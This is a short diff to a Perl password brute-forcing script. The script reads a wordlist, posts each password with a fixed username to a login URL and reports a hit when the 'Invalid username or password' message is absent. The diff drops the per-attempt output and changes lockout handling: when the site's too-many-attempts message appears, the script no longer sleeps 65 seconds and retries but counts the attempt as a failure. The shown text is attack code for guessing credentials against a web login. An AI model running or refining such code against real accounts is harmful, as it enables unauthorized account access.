@@ -62,8 +62,6 @@ say colored("[*] Obtaining password length for user '$username', this may take a
 while (my $pass = <$fh>) {
     chomp($pass);
 
-    say "[*] Testing: $pass";
-
     if (&makeRequest($pass)) {
         say colored("[+] Found: $pass" , "green");
         exit;
@@ -77,11 +75,8 @@ sub makeRequest {
     my $response = $ua->post($url, {username => $username, password => $password});
 
     if ($response->is_success || $response->status_line =~ /302 found/i) {
-        if ($response->decoded_content =~ /You have made too many incorrect login attempts. Please try again in 1 minute/ig) {
-            say colored("[zzz] Nap for 1 minute...", "blue");
-            sleep(65);
-            return &makeRequest($password);
-        }
+        return 0 if ($response->decoded_content =~ /You have made too many incorrect login attempts. Please try again in 1 minute/ig);
+
         return ($response->decoded_content =~ /Invalid username or password/ig) ? 0 : 1;
     } else {
         say STDERR colored($response->status_line, "on_red");
